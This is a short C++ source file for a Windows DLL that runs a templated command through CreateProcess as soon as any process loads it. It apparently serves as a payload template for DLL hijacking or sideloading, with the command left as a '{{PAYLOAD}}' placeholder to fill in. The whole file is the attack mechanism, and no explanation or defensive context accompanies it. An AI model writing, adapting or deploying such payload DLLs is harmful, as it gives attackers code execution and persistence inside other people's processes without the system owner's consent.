#include <windows.h>
#include <string>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        std::wstring command = L"{{PAYLOAD}}";
        STARTUPINFO si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        CreateProcess(NULL, const_cast<wchar_t*>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return TRUE;
}
